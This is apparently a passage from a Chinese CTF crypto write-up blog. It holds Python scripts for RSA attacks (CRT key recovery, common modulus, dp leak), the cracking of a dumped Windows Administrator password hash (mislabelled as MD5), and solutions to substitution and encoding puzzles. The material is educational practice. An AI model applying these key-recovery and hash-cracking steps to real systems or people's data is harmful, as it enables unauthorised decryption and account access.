<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>p <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>q <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>dp <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>dq <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>c <span class="token operator">=</span> gp<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>n <span class="token operator">=</span> p<span class="token operator">*</span>q</pre></td></tr><tr><td data-num="10"></td><td><pre>phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>dd <span class="token operator">=</span> gp<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>d<span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token operator">-</span>dq<span class="token punctuation">)</span><span class="token operator">//</span>dd <span class="token operator">*</span> gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>dd<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>dd<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>dq</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>m <span class="token operator">=</span> gp<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>                               <span class="token comment">#10 进制明文</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                      <span class="token comment">#16 进制明文</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">#16 进制转文本</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/ebe2288ce87edb075a61d43b0f78d1c.png" alt="ebe2288ce87edb075a61d43b0f78d1c" /></p>
<p>得到</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">11630208090204506176302961171539022042721137807911818876637821759101</span></pre></td></tr><tr><td data-num="2"></td><td><pre>6e6f784354467b57333163306d335f37305f4368316e343730776e7d</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token string">b'noxCTF&#123;W31c0m3_70_Ch1n470wn&#125;'</span></pre></td></tr></table></figure><h2 id="权限获得第一步"><a class="anchor" href="#权限获得第一步">#</a> 权限获得第一步</h2>
<p>你猜这是什么东西，记得破解后把其中的密码给我。答案为非常规形式。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/8ba6fd3c918d3c59434249054c39ebf.png" alt="8ba6fd3c918d3c59434249054c39ebf" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>Administrator<span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">:</span>806EDC27AA52E314AAD3B435B51404EE<span class="token punctuation">:</span>F4AD50F57683D4260DFD48AA351A17A8<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span></pre></td></tr></table></figure><p>一看是我们熟悉的 md5 加密</p>
<p>将第二串密文解密得到：3617656</p>
<p>即 flag 是</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span><span class="token number">3617656</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="old-fashion"><a class="anchor" href="#old-fashion">#</a> old-fashion</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>密文</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>Os drnuzearyuwn<span class="token punctuation">,</span> y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz<span class="token punctuation">,</span> ydderxosa ze y rlatfyr jnjzli<span class="token punctuation">;</span> mjy gfbmw vla xy wbfnsy symmyew <span class="token punctuation">(</span>mjy vrwm qrvvrf<span class="token punctuation">)</span><span class="token punctuation">,</span> hlbew rd symmyew<span class="token punctuation">,</span> mebhsymw rd symmyew<span class="token punctuation">,</span> vbomgeyw rd mjy lxrzy<span class="token punctuation">,</span> lfk wr dremj<span class="token punctuation">.</span> Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf<span class="token punctuation">.</span> Wr mjy dsln bw f1_2jyf<span class="token operator">-</span>k3_jg1<span class="token operator">-</span>vb<span class="token operator">-</span>vl_l</pre></td></tr></table></figure><p>在这个<span class="exturl" data-url="aHR0cHM6Ly9xdWlwcWl1cC5jb20v">网站</span>上暴力破解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/487a2d35b2235becf8f94581a8b9ae1.png" alt="487a2d35b2235becf8f94581a8b9ae1" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/dcf87f04641553434a66772400b1fa8.png" alt="dcf87f04641553434a66772400b1fa8" /></p>
<p>可以看到 flag</p>
<h2 id="世上无难事"><a class="anchor" href="#世上无难事">#</a> 世上无难事</h2>
<p>以下是某国现任总统外发的一段指令，经过一种奇异的加密方式，毫无规律，看来只能分析了。请将这段语句还原成通顺语句，并从中找到 key 作为答案提交，答案是 32 位，包含小写字母。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>题目打开就直接告诉你没有规律 2333</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401201616983.png" alt="image-20220401201616983" /></p>
<p>密文如下</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>VIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09</pre></td></tr></table></figure><p>这个时候我又想到了那个</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401201729718.png" alt="image-20220401201729718" /></p>
<p>在这里发现了一个 THE KEY IS  <code>640E11012805F211B0AB24FF02A1ED09</code> ，好吧，我心动了</p>
<p>根据题目提示将大写字母改为小写字母得到 flag</p>
<h2 id="rsa3"><a class="anchor" href="#rsa3">#</a> RSA3</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目得到 c1,n,e1,c2,e2, 为 RSA 共模攻击</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>c1<span class="token operator">=</span><span class="token number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></pre></td></tr><tr><td data-num="2"></td><td><pre>n<span class="token operator">=</span><span class="token number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></pre></td></tr><tr><td data-num="3"></td><td><pre>e1<span class="token operator">=</span><span class="token number">11187289</span></pre></td></tr><tr><td data-num="4"></td><td><pre>c2<span class="token operator">=</span><span class="token number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></pre></td></tr><tr><td data-num="5"></td><td><pre>e2<span class="token operator">=</span><span class="token number">9647291</span></pre></td></tr></table></figure><p>因为 e1,e2 的最大公约数为 1，这个可以通过 gmpy2.gcd (e1,e2) 验证</p>
<p>因此：存在 e1<em>s1+e2</em>s2=1</p>
<p>m = c1^d1 mod n</p>
<p>m = c2^d2 mod n</p>
<p>c1^s1 mod n=m^(e1*s1) mod n *</p>
<p><em>c2^s2 mod n=m^(e2</em>s2) mod n c</p>
<p>1<sup>s1*c2</sup>s2 mod n=m^(e1<em>s1+e2</em>s2) mod n *</p>
<p>*c1<sup>s1*c2</sup>s2  =m mod n</p>
<p>因此只需要找到 s1,s2 即可求出明文 m</p>
<p><strong>RSA 共模攻击 Python 脚本</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">gongmo</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">return</span> a<span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">return</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y</pre></td></tr><tr><td data-num="10"></td><td><pre>    s <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment"># 求模反元素</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token operator">-</span> s1</pre></td></tr><tr><td data-num="17"></td><td><pre>        c1 <span class="token operator">=</span> invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        s2 <span class="token operator">=</span> <span class="token operator">-</span> s2</pre></td></tr><tr><td data-num="20"></td><td><pre>        c2 <span class="token operator">=</span> invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n</pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> m</pre></td></tr><tr><td data-num="23"></td><td><pre>c1<span class="token operator">=</span><span class="token number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></pre></td></tr><tr><td data-num="24"></td><td><pre>n<span class="token operator">=</span><span class="token number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></pre></td></tr><tr><td data-num="25"></td><td><pre>e1<span class="token operator">=</span><span class="token number">11187289</span></pre></td></tr><tr><td data-num="26"></td><td><pre>c2<span class="token operator">=</span><span class="token number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></pre></td></tr><tr><td data-num="27"></td><td><pre>e2<span class="token operator">=</span><span class="token number">9647291</span></pre></td></tr><tr><td data-num="28"></td><td><pre>result <span class="token operator">=</span> gongmo<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/51518d0b86962addf1b3eab6246b20c.png" alt="51518d0b86962addf1b3eab6246b20c" /></p>
<h2 id="rsa2"><a class="anchor" href="#rsa2">#</a> RSA2</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件得到</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="2"></td><td><pre>n <span class="token operator">=</span> <span class="token number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></pre></td></tr><tr><td data-num="3"></td><td><pre>dp <span class="token operator">=</span> <span class="token number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>c <span class="token operator">=</span> <span class="token number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></pre></td></tr></table></figure><p>分析可知</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>e<span class="token operator">&lt;</span>p<span class="token operator">-</span><span class="token number">1</span></pre></td></tr><tr><td data-num="2"></td><td><pre>dp<span class="token operator">*</span>e<span class="token operator">=</span>ed<span class="token punctuation">(</span>modp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>ed<span class="token operator">=</span>k<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>dp<span class="token operator">*</span>e</pre></td></tr><tr><td data-num="4"></td><td><pre>ed<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>mod<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>ed<span class="token operator">=</span>m<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span></pre></td></tr><tr><td data-num="6"></td><td><pre>联立可得<span class="token punctuation">:</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span>dp<span class="token operator">*</span>e     <span class="token operator">//</span><span class="token punctuation">(</span>i<span class="token operator">=</span>m<span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>dp<span class="token operator">&lt;</span>p<span class="token operator">-</span><span class="token number">1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>i<span class="token operator">&lt;</span>e</pre></td></tr><tr><td data-num="9"></td><td><pre>找到i即可计算出p</pre></td></tr></table></figure><p>dp 泄露攻击脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n <span class="token operator">=</span> <span class="token number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></pre></td></tr><tr><td data-num="6"></td><td><pre>dp <span class="token operator">=</span> <span class="token number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>c <span class="token operator">=</span> <span class="token number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>                   <span class="token comment">#在范围 (1,e) 之间进行遍历</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token operator">*</span>e<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span> n<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>dp<span class="token operator">*</span>e<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>   <span class="token comment">#存在 p，使得 n 能被 p 整除</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            p<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>dp<span class="token operator">*</span>e<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            q<span class="token operator">=</span>n<span class="token operator">//</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>dp<span class="token operator">*</span>e<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            phi<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">#欧拉定理</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            d<span class="token operator">=</span>gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>         <span class="token comment">#求模逆</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>               <span class="token comment">#快速求幂取模运算</span></pre></td></tr><tr><td data-num="19"></td><td><pre>           </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>                               <span class="token comment">#10 进制明文</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                      <span class="token comment">#16 进制明文</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">#16 进制转文本</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>运行得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/2487e191571aa116b6c9b5909b1b2b2.png" alt="2487e191571aa116b6c9b5909b1b2b2" /></p>
<h2 id="unencode"><a class="anchor" href="#unencode">#</a> Unencode</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>题目打开</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>89FQA9WMD<span class="token operator">&lt;</span>V1A<span class="token operator">&lt;</span>V1S83DY<span class="token punctuation">.</span><span class="token comment">#&lt;W3$Q,2TM]</span></pre></td></tr></table></figure><p>看题目中由 encode 可以猜到是一种编码方式</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/62ec889688a7a37a890d6cc2e31db50.png" alt="62ec889688a7a37a890d6cc2e31db50" /></p>
<h2 id="afctf2018morse"><a class="anchor" href="#afctf2018morse">#</a> [AFCTF2018]Morse</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
